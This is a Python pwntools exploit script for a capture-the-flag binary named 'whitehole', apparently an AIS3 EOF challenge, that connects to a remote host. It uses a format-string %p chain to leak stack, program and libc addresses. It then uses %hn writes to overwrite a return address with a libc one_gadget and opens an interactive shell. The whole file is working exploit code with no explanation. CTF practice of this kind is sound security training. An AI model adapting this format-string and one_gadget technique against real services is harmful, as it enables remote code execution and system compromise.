from pwn import *

local = False
elf = 'whitehole' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "eof.ais3.org"
    port = 6666
    r = remote(ip,port)

context.arch = 'amd64'

raw_input("aa")

offset = 6

exploit = "%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p"
r.send(exploit)
r.recvuntil(',')
r.recvuntil(',')
r.recvuntil(',')
r.recvuntil(',')
stack = r.recvuntil(',')[-5:-1]
stack =  int(stack,16)
ret_addr = r.recvuntil(',')[:-1]
ret_addr = int(ret_addr,16)

r.recvuntil(',')
main = r.recvuntil(',')[:-1]
main = int(main,16)

r.recvuntil(',')
offset = 0x7f97330b5b97 - 0x00007f9733094000
libc_addr =  r.recvuntil(',')[:-1]
libc_addr = int(libc_addr,16) - offset
r.recv()

one_gadget = libc_addr + 0x4f322
print_plt = ret_addr - ( 0x560f8d3421fa - 0x560f8d342030)
print_got = ret_addr - ( 0x55dedee8c1fa - 0x55dedee8f018)

success("libc_addr -> %s" ,  hex(libc_addr))
success("print_plt -> %s" ,  hex(print_plt))
success("print_got -> %s" ,  hex(print_got))
success("one_gadget -> %s" ,  hex(one_gadget))

exploit1 = "%"+str(stack + 24)+"c%5$hn%2c%12$hnaaa".ljust( 0x20 , '\x00' )
r.sendline(exploit1)
r.recvuntil('aaa')

hi = int(hex(one_gadget)[-8:-4],16)
lo = int(hex(one_gadget)[-4:],16)

if(hi - lo > 0):
    exploit1 = "%" + str(lo) +"c%7$hn%" +  str(hi - lo) + "c%38$hnaaa".ljust( 0x20 , '\x00' )
else:
    exploit1 = "%" + str(hi) +"c%38$hn%" +  str(lo - hi) + "c%7$hnaaa".ljust( 0x20 , '\x00' )
r.sendline(exploit1)
r.recvuntil('aaa')

lo = int(hex(main)[-4:],16)
exploit1 = "%"+str(stack - 8)+"c%5$hnaaa".ljust( 0x20 , '\x00' )
r.sendline(exploit1)
r.recvuntil('aaa')

exploit1 = "%" +  str(lo) + "c%7$hnaaa".ljust( 0x20 , '\x00' )
r.send(exploit1)
r.recvuntil('aaa')

r.interactive()
